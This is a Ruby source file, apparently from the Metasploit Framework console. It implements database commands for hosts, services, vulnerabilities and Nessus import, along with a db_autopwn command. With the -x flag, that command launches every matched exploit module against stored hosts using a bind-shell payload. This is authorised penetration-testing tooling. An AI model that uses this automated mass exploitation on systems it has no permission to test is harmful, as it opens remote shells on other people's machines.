module Msf
module Ui
module Console
module CommandDispatcher
module Db

		#
		# The dispatcher's name.
		#
		def name
			"Database Backend"
		end

		#
		# Returns the hash of commands supported by this dispatcher.
		#
		def commands
			{
				"db_hosts"    => "List all hosts in the database",
				"db_services" => "List all services in the database",
				"db_vulns"    => "List all vulnerabilities in the database",
				"db_add_host" => "Add one or more hosts to the database",
				"db_add_port" => "Add a port to host",
				"db_autopwn"  => "Automatically exploit everything",
				"db_import_nessus_nbe" => "Import a Nessus scan result file (NBE)",
				# "db_import_nmap_xml"   => "Import a Nmap scan results file (-oX)",
			}
		end

		def cmd_db_hosts(*args)
			framework.db.each_host do |host|
				print_status("Host: #{host.address}")
			end
		end

		def cmd_db_services(*args)
			framework.db.each_service do |service|
				# print_status("Service: host=#{service.host.address} port=#{service.port} proto=#{service.proto} state=#{service.state}")
				print_status("Service: host_id=#{service.host_id} port=#{service.port} proto=#{service.proto} state=#{service.state}")				
			end
		end		
		
		def cmd_db_vulns(*args)
			framework.db.each_vuln do |vuln|
				reflist = vuln.refs.map { |r| r.name }
				puts "Vuln: host=#{vuln.host.address} port=#{vuln.service.port} proto=#{vuln.service.proto} name=#{vuln.name} refs=#{reflist.join(',')}"
			end
		end	
		
		def cmd_db_add_host(*args)
			print_status("Adding #{args.length.to_s} hosts...")
			args.each do |address|
				framework.db.get_host(nil, address)
			end
		end

		def cmd_db_add_port(*args)
			if (not args or args.length < 3)
				print_status("Usage: db_add_port [host] [port] [proto]")
				return
			end

			host = framework.db.get_host(nil, args[0])
			return if not host
			
			service = framework.db.get_service(nil, host, args[2].downcase, args[1].to_i)
			return if not service
			
			print_status("Service: host=#{service.host.address} port=#{service.port} proto=#{service.proto} state=#{service.state}")
		end

		def cmd_db_import_nessus_nbe(*args)
			if (not (args and args.length == 1))
				print_status("Usage: db_import_nessus_nbe [nessus.nbe]")
				return
			end
			
			if (not File.readable?(args[0])) 
				print_status("Could not read the NBE file")
				return
			end
			
			fd = File.open(args[0], 'r')
			fd.each_line do |line|
				r = line.split('|')
				next if r[0] != 'results'
				addr = r[2]
				nasl = r[4]
				hole = r[5]
				data = r[6]
				refs = {}
				
				m = r[3].match(/^([^\(]+)\((\d+)\/([^\)]+)\)/)
				next if not m
				
				host = framework.db.get_host(nil, addr)
				next if not host
				
				service = framework.db.get_service(nil, host, m[3].downcase, m[2].to_i)
				service.name = m[1]
				service.save
				
				next if not nasl
				
				data.gsub!("\\n", "\n")
				
				
				if (data =~ /^CVE : (.*)$/)
					$1.gsub(/C(VE|AN)\-/, '').split(',').map { |r| r.strip }.each do |r|
						refs[ 'CVE-' + r ] = true
					end
				end

				if (data =~ /^BID : (.*)$/)
					$1.split(',').map { |r| r.strip }.each do |r|
						refs[ 'BID-' + r ] = true
					end
				end

				if (data =~ /^Other references : (.*)$/)
					$1.split(',').map { |r| r.strip }.each do |r|
						refs[ r ] = true
					end
				end
								
				refs[ 'NSS-' + nasl.to_s ] = true
								
				vuln = framework.db.get_vuln(nil, service, 'NSS-' + nasl.to_s, data)
				
				rids = []
				refs.keys.each do |r|
					rids << framework.db.get_ref(nil, r)
				end
				
				vuln.refs << (rids - vuln.refs)
			end
		end
		
		def cmd_db_autopwn(*args)
		
			print_status("Analyzing module and vulnerability data...")
			stamp = Time.now.to_f
			vcnt  = 0
			rcnt  = 0
			
			matches = {}
			
			# Scan all exploit modules for matching references
			framework.exploits.each_module do |n,m|
				e = m.new
				e.references.each do |r|
					rcnt += 1
					
					ref_name = r.ctx_id + '-' + r.ctx_val
					ref = framework.db.has_ref?(ref_name)
					next if not ref

					ref.vulns.each do |vuln|
						vcnt  += 1
						serv  = vuln.service
						xport = serv.port
						xprot = serv.proto
						xhost = serv.host.address
						matches[[xport,xprot,xhost,'exploit/'+n]]=true
					end
				end
			end
			
			# Scan all auxiliary modules for matching references
			framework.auxiliary.each_module do |n,m|
				e = m.new
				e.references.each do |r|
					rcnt += 1
					
					ref_name = r.ctx_id + '-' + r.ctx_val
					ref = framework.db.has_ref?(ref_name)
					next if not ref

					ref.vulns.each do |vuln|
						vcnt  += 1
						serv  = vuln.service
						xport = serv.port
						xprot = serv.proto
						xhost = serv.host.address
						matches[[xport,xprot,xhost,'auxiliary/'+n]]=true
					end
				end
			end
			
			print_status("Analysis completed in #{(Time.now.to_f - stamp).to_s} seconds (#{vcnt.to_s} vulns / #{rcnt.to_s} refs)")
			
			case args[0]		
			when '-t', nil
				matches.each_key do |xref|
					print_status("Try #{xref[3]} against #{xref[2].to_s}:#{xref[0].to_s}")
				end

			when '-x'
				matches.each_key do |xref|
					print_status("Launching #{xref[3]} against #{xref[2].to_s}:#{xref[0].to_s}...")
					begin
						mod = nil
						
						if ((mod = framework.modules.create(xref[3])) == nil)
							print_status("Failed to initialize #{xref[3]}")
							next
						end
						
						mod.datastore['RHOST'] = xref[2]
						mod.datastore['RPORT'] = xref[0].to_s
						mod.datastore['PAYLOAD'] = 'generic/shell_bind_tcp'
						mod.datastore['LPORT']   = (rand(0xfff) + 4000).to_s

						begin
							case mod.type
							when MODULE_EXPLOIT
								session = mod.exploit_simple(
									'Payload'        => mod.datastore['PAYLOAD'],
									'LocalInput'     => driver.input,
									'LocalOutput'    => driver.output,
									'RunAsJob'       => true) if mod.autofilter()
							when MODULE_AUX
								session = mod.run_simple(
									'LocalInput'     => driver.input,
									'LocalOutput'    => driver.output,
									'RunAsJob'       => true) if mod.autofilter()					
							end
						rescue ::Exception
							print_status(" >> Exception during launch from #{xref[3]}: #{$!.to_s}")
						end
						
					rescue ::Exception
						print_status(" >> Exception from #{xref[3]}: #{$!.to_s}")
					end
				end	
			else
				print_status("Usage: db_autopwn [-t]|[-x]")
			end
		
		end

end
end
end
end
end
